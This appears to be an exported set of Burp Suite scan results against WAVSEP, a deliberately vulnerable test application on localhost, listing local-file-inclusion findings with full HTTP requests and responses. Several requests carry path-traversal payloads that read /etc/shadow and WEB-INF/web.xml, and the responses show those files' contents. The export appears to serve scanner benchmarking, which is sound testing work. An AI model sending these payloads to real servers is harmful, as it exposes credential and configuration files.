http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case32-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case32-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-SlashPathReq-Read.jsp?target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:09:09 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp,1,Burp,File path traversal,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 127
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:10 GMT
Connection: close
Content-Length: 343
root:*LOCK*:14600::::::
bin:*:18313:0:99999:7:::
daemon:*:18313:0:99999:7:::
adm:*:18313:0:99999:7:::
lp:*:18313:0:99999:7:::
sync:*:18313:0:99999:7:::
shutdown:*:18313:0:99999:7:::
halt:*:18313:0:99999:7:::
mail:*:18313:0:99999:7:::
operator:*:18313:0:99999:7:::
games:*:18313:0:99999:7:::
ftp:*:18313:0:99999:7:::
nobody:*:18313:0:99999:7:::"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:05 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case19-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case19-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:08:57 GMT
Connection: close
Content-Length: 1644

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case13-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case13-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:41 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 404 
Content-Type: text/html;charset=ISO-8859-1
Content-Language: en
Content-Length: 714
Date: Tue, 23 Apr 2024 14:07:01 GMT
Connection: close
<!doctype html><html lang=""en""><head><title>HTTP Status 404 ? Not Found</title><style type=""text/css"">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 ? Not Found</h1><hr class=""line"" /><p><b>Type</b> Status Report</p><p><b>Message</b> File Not Found</p> [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case15-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case15-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case15-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:48 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp,1,Burp,File path traversal,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 18
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:21 GMT
Connection: close
Content-Length: 343
root:*LOCK*:14600::::::
bin:*:18313:0:99999:7:::
daemon:*:18313:0:99999:7:::
adm:*:18313:0:99999:7:::
lp:*:18313:0:99999:7:::
sync:*:18313:0:99999:7:::
shutdown:*:18313:0:99999:7:::
halt:*:18313:0:99999:7:::
mail:*:18313:0:99999:7:::
operator:*:18313:0:99999:7:::
games:*:18313:0:99999:7:::
ftp:*:18313:0:99999:7:::
nobody:*:18313:0:99999:7:::"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp?target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:08:17 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case67-LFI-ContextStream-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case67-LFI-ContextStream-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f.%2fdefault.txt HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-404Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 404 
Content-Type: text/html;charset=ISO-8859-1
Content-Language: en
Content-Length: 714
Date: Tue, 23 Apr 2024 14:07:13 GMT
Connection: close
<!doctype html><html lang=""en""><head><title>HTTP Status 404 ? Not Found</title><style type=""text/css"">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 ? Not Found</h1><hr class=""line"" /><p><b>Type</b> Status Report</p><p><b>Message</b> File Not Found</p> [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 302 
Location: MissingResource.html
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 0
Date: Tue, 23 Apr 2024 14:08:00 GMT
Connection: close
"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:33 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case44-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%5c.%5cdefault.txt","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:13 GMT
Connection: close
Content-Length: 1700

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
